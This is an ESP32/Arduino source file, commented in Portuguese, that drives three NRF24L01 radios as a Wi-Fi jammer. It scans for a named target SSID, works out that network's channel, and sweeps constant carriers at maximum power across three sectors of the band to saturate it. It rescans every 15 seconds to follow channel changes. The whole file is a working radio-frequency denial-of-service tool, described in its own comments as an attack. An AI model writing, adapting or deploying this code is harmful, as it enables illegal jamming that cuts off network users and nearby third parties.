/*
 * Código para usar um ESP32 com três módulos NRF24L01
 * para encontrar o canal de uma rede Wi-Fi e saturar sua largura de banda
 * com uma varredura setorizada e dinâmica.
 *
 * Estratégia: O ESP32 descobre o canal Wi-Fi alvo e divide sua
 * largura de banda em três setores. Cada módulo NRF24L01 varre
 * continuamente um desses setores, criando uma interferência dinâmica
 * e massiva em toda a banda do canal.
 *
 */

#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>
#include "WiFi.h" // Biblioteca para usar o Wi-Fi do ESP32

// --- CONFIGURAÇÃO DO ALVO ---
// !!! IMPORTANTE: Altere para o nome exato da sua rede Wi-Fi !!!
const char* targetSsid = "Bernardo.2G";
const int BAND_WIDTH = 9; // Largura da banda a ser atacada a partir do centro (+/- 9MHz)

// --- PINAGEM DOS RÁDIOS E LEDs ---
const int pinoCE1 = 4, pinoCSN1 = 5, ledPin1 = 13;
const int pinoCE2 = 26, pinoCSN2 = 27, ledPin2 = 12;
const int pinoCE3 = 32, pinoCSN3 = 33, ledPin3 = 14;

// --- INSTÂNCIAS DOS RÁDIOS ---
RF24 radio1(pinoCE1, pinoCSN1);
RF24 radio2(pinoCE2, pinoCSN2);
RF24 radio3(pinoCE3, pinoCSN3);

// --- VARIÁVEIS DE CONTROLE ---
byte currentTargetCenterChannel = 0;
unsigned long lastScanTime = 0;
const long scanInterval = 15000; // Escaneia a cada 15 segundos

// Variáveis para os limites da varredura de cada rádio
byte sweepStart1, sweepEnd1, sweepCurrent1;
byte sweepStart2, sweepEnd2, sweepCurrent2;
byte sweepStart3, sweepEnd3, sweepCurrent3;

// Função para configurar um rádio e seu LED de status
void configurarRadio(RF24 &radio, int ledPin, const char* nomeRadio) {
  Serial.print("Configurando ");
  Serial.println(nomeRadio);
  if (radio.begin()) {
    radio.setDataRate(RF24_2MBPS);
    radio.setPALevel(RF24_PA_MAX);
    radio.setAutoAck(false);
    radio.setRetries(0, 0);
    digitalWrite(ledPin, HIGH);
    Serial.print(nomeRadio);
    Serial.println(" configurado. LED LIGADO.");
  } else {
    digitalWrite(ledPin, LOW);
    Serial.print("Falha ao iniciar o ");
    Serial.println(nomeRadio);
  }
}

// Função para escanear o Wi-Fi e definir os canais de ataque
bool findAndSetTargetChannels() {
  Serial.print("Escaneando por '");
  Serial.print(targetSsid);
  Serial.println("'...");
  
  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("Nenhuma rede encontrada.");
    return false;
  }

  for (int i = 0; i < n; ++i) {
    if (WiFi.SSID(i) == targetSsid) {
      byte wifiChannel = WiFi.channel(i);
      byte nrfCenterChannel = (wifiChannel - 1) * 5 + 12;
      
      Serial.print("Alvo encontrado! Canal Wi-Fi: ");
      Serial.print(wifiChannel);
      Serial.print(" (Frequência central NRF: ");
      Serial.print(nrfCenterChannel);
      Serial.println(")");
      
      if (nrfCenterChannel != currentTargetCenterChannel) {
        Serial.println("Canal mudou ou é a primeira varredura. Atualizando zonas de varredura...");
        currentTargetCenterChannel = nrfCenterChannel;
        
        int sectorWidth = (BAND_WIDTH * 2 + 1) / 3;
        
        sweepStart1 = nrfCenterChannel - BAND_WIDTH;
        sweepEnd1 = sweepStart1 + sectorWidth -1;
        
        sweepStart2 = sweepEnd1 + 1;
        sweepEnd2 = sweepStart2 + sectorWidth -1;
        
        sweepStart3 = sweepEnd2 + 1;
        sweepEnd3 = nrfCenterChannel + BAND_WIDTH;
        
        // Inicia os contadores no início de cada zona
        sweepCurrent1 = sweepStart1;
        sweepCurrent2 = sweepStart2;
        sweepCurrent3 = sweepStart3;

        Serial.printf("Zona 1 (Rádio 1): Canais %d a %d\n", sweepStart1, sweepEnd1);
        Serial.printf("Zona 2 (Rádio 2): Canais %d a %d\n", sweepStart2, sweepEnd2);
        Serial.printf("Zona 3 (Rádio 3): Canais %d a %d\n", sweepStart3, sweepEnd3);
      } else {
        Serial.println("Canal permanece o mesmo. Nenhuma atualização necessária.");
      }
      return true;
    }
  }

  Serial.println("Rede alvo não encontrada nesta varredura.");
  return false;
}

void setup() {
  Serial.begin(115200);
  while (!Serial);
  Serial.println("--- Ataque de Varredura de Banda Setorizada com 3x NRF24L01 ---");

  // Configura os LEDs
  pinMode(ledPin1, OUTPUT); pinMode(ledPin2, OUTPUT); pinMode(ledPin3, OUTPUT);
  digitalWrite(ledPin1, LOW); digitalWrite(ledPin2, LOW); digitalWrite(ledPin3, LOW);

  // Configura os rádios NRF24L01
  configurarRadio(radio1, ledPin1, "Radio 1");
  configurarRadio(radio2, ledPin2, "Radio 2");
  configurarRadio(radio3, ledPin3, "Radio 3");

  // Configura o Wi-Fi do ESP32 para modo de escaneamento
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  // Faz a primeira busca e inicia a transmissão
  if (findAndSetTargetChannels()) {
    Serial.println("Iniciando transmissão de portadora contínua...");
    radio1.startConstCarrier(RF24_PA_MAX, sweepStart1);
    radio2.startConstCarrier(RF24_PA_MAX, sweepStart2);
    radio3.startConstCarrier(RF24_PA_MAX, sweepStart3);
  } else {
    Serial.println("Alvo não encontrado na primeira busca. Tente novamente.");
  }
  
  Serial.println("----------------------------------------");
}

void loop() {
  // Verifica se já é hora de escanear novamente
  if (millis() - lastScanTime > scanInterval) {
    lastScanTime = millis();
    findAndSetTargetChannels();
    Serial.println("----------------------------------------");
  }

  // --- VARREDURA DO MÓDULO 1 ---
  sweepCurrent1++;
  if (sweepCurrent1 > sweepEnd1) {
    sweepCurrent1 = sweepStart1;
  }
  radio1.setChannel(sweepCurrent1);

  // --- VARREDURA DO MÓDULO 2 ---
  sweepCurrent2++;
  if (sweepCurrent2 > sweepEnd2) {
    sweepCurrent2 = sweepStart2;
  }
  radio2.setChannel(sweepCurrent2);

  // --- VARREDURA DO MÓDULO 3 ---
  sweepCurrent3++;
  if (sweepCurrent3 > sweepEnd3) {
    sweepCurrent3 = sweepStart3;
  }
  radio3.setChannel(sweepCurrent3);
}
